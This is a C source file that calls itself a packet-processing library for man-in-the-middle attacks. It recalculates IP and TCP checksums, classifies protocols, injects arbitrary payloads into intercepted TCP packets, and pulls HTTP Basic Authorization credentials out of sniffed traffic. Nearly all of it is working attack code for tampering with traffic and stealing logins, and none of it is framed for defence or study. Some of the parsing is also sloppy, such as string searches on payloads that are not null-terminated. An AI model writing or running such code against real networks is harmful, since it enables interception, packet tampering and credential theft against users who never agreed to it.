/*
 * libmitm_packet.c - High-performance packet processing for MITM
 *
 * Provides fast operations for:
 * - TCP/IP checksum recalculation
 * - Payload injection
 * - Protocol classification
 */

#include <arpa/inet.h>
#include <stdint.h>
#include <string.h>

// IP header structure
struct ip_header {
  uint8_t ihl_version;
  uint8_t tos;
  uint16_t tot_len;
  uint16_t id;
  uint16_t frag_off;
  uint8_t ttl;
  uint8_t protocol;
  uint16_t checksum;
  uint32_t saddr;
  uint32_t daddr;
};

// TCP header structure
struct tcp_header {
  uint16_t source;
  uint16_t dest;
  uint32_t seq;
  uint32_t ack_seq;
  uint16_t flags;
  uint16_t window;
  uint16_t checksum;
  uint16_t urg_ptr;
};

/**
 * Calculate IP header checksum
 */
uint16_t ip_checksum(const uint8_t *buf, size_t len) {
  uint32_t sum = 0;
  const uint16_t *ptr = (const uint16_t *)buf;

  while (len > 1) {
    sum += *ptr++;
    len -= 2;
  }

  if (len == 1) {
    sum += *(uint8_t *)ptr;
  }

  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  return ~sum;
}

/**
 * Calculate TCP checksum with pseudo-header
 */
uint16_t tcp_checksum(const uint8_t *packet, size_t packet_len) {
  struct ip_header *iph = (struct ip_header *)packet;
  size_t iph_len = (iph->ihl_version & 0x0F) * 4;
  struct tcp_header *tcph = (struct tcp_header *)(packet + iph_len);
  size_t tcp_len = packet_len - iph_len;

  // Pseudo-header
  uint32_t sum = 0;
  sum += (iph->saddr >> 16) & 0xFFFF;
  sum += iph->saddr & 0xFFFF;
  sum += (iph->daddr >> 16) & 0xFFFF;
  sum += iph->daddr & 0xFFFF;
  sum += htons(iph->protocol);
  sum += htons(tcp_len);

  // TCP header + data
  const uint16_t *ptr = (const uint16_t *)tcph;
  size_t len = tcp_len;

  while (len > 1) {
    sum += *ptr++;
    len -= 2;
  }

  if (len == 1) {
    sum += *(uint8_t *)ptr;
  }

  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  return ~sum;
}

/**
 * Recalculate both IP and TCP checksums after modification
 */
void recalc_all_checksums(uint8_t *packet, size_t packet_len) {
  struct ip_header *iph = (struct ip_header *)packet;
  size_t iph_len = (iph->ihl_version & 0x0F) * 4;
  struct tcp_header *tcph = (struct tcp_header *)(packet + iph_len);

  // Zero out old checksums
  iph->checksum = 0;
  tcph->checksum = 0;

  // Calculate new checksums
  iph->checksum = ip_checksum(packet, iph_len);
  tcph->checksum = tcp_checksum(packet, packet_len);
}

/**
 * Fast protocol classification
 * Returns: 1=HTTP, 2=HTTPS, 3=FTP, 4=SMTP, 5=SSH, 6=RDP, 0=Unknown
 */
int classify_protocol(const uint8_t *packet, size_t len) {
  if (len < 40)
    return 0; // Too small

  struct ip_header *iph = (struct ip_header *)packet;
  if (iph->protocol != 6)
    return 0; // Not TCP

  size_t iph_len = (iph->ihl_version & 0x0F) * 4;
  struct tcp_header *tcph = (struct tcp_header *)(packet + iph_len);

  uint16_t dport = ntohs(tcph->dest);
  uint16_t sport = ntohs(tcph->source);

  // Check well-known ports
  if (dport == 80 || sport == 80)
    return 1; // HTTP
  if (dport == 443 || sport == 443)
    return 2; // HTTPS
  if (dport == 21 || sport == 21)
    return 3; // FTP
  if (dport == 25 || sport == 25)
    return 4; // SMTP
  if (dport == 22 || sport == 22)
    return 5; // SSH
  if (dport == 3389 || sport == 3389)
    return 6; // RDP

  // Deep packet inspection for HTTP
  size_t tcp_hdr_len = ((ntohs(tcph->flags) >> 12) & 0x0F) * 4;
  const uint8_t *payload = packet + iph_len + tcp_hdr_len;
  size_t payload_len = len - iph_len - tcp_hdr_len;

  if (payload_len > 4) {
    if (memcmp(payload, "GET ", 4) == 0 || memcmp(payload, "POST", 4) == 0 ||
        memcmp(payload, "HTTP", 4) == 0) {
      return 1; // HTTP
    }
    if (payload[0] == 0x16 && payload[1] == 0x03) {
      return 2; // TLS handshake
    }
  }

  return 0;
}

/**
 * Inject payload into TCP packet
 * Returns: new packet length, or -1 on error
 */
int inject_payload(uint8_t *packet, size_t packet_len, const uint8_t *payload,
                   size_t payload_len, uint8_t *out_packet,
                   size_t out_max_len) {

  if (packet_len + payload_len > out_max_len) {
    return -1; // Buffer too small
  }

  struct ip_header *iph = (struct ip_header *)packet;
  size_t iph_len = (iph->ihl_version & 0x0F) * 4;
  struct tcp_header *tcph = (struct tcp_header *)(packet + iph_len);
  size_t tcp_hdr_len = ((ntohs(tcph->flags) >> 12) & 0x0F) * 4;
  size_t headers_len = iph_len + tcp_hdr_len;

  // Copy headers
  memcpy(out_packet, packet, headers_len);

  // Inject payload
  memcpy(out_packet + headers_len, payload, payload_len);

  // Copy original payload
  size_t orig_payload_len = packet_len - headers_len;
  memcpy(out_packet + headers_len + payload_len, packet + headers_len,
         orig_payload_len);

  size_t new_len = headers_len + payload_len + orig_payload_len;

  // Update IP length
  struct ip_header *new_iph = (struct ip_header *)out_packet;
  new_iph->tot_len = htons(new_len);

  // Recalculate checksums
  recalc_all_checksums(out_packet, new_len);

  return new_len;
}

/**
 * Extract HTTP credentials from packet
 * Returns: 1 if credentials found, 0 otherwise
 */
int extract_http_credentials(const uint8_t *packet, size_t len, char *username,
                             size_t username_len, char *password,
                             size_t password_len) {

  struct ip_header *iph = (struct ip_header *)packet;
  size_t iph_len = (iph->ihl_version & 0x0F) * 4;
  struct tcp_header *tcph = (struct tcp_header *)(packet + iph_len);
  size_t tcp_hdr_len = ((ntohs(tcph->flags) >> 12) & 0x0F) * 4;

  const uint8_t *payload = packet + iph_len + tcp_hdr_len;
  size_t payload_len = len - iph_len - tcp_hdr_len;

  // Search for "Authorization: Basic "
  const char *auth_header = "Authorization: Basic ";
  const uint8_t *auth_pos =
      (const uint8_t *)strstr((const char *)payload, auth_header);

  if (!auth_pos || auth_pos >= payload + payload_len) {
    return 0;
  }

  // TODO: Base64 decode and parse username:password
  // For now, just return the encoded string
  const uint8_t *cred_start = auth_pos + strlen(auth_header);
  const uint8_t *cred_end =
      (const uint8_t *)strchr((const char *)cred_start, '\r');

  if (!cred_end) {
    cred_end = (const uint8_t *)strchr((const char *)cred_start, '\n');
  }

  if (cred_end) {
    size_t cred_len = cred_end - cred_start;
    if (cred_len < username_len) {
      memcpy(username, cred_start, cred_len);
      username[cred_len] = '\0';
      return 1;
    }
  }

  return 0;
}
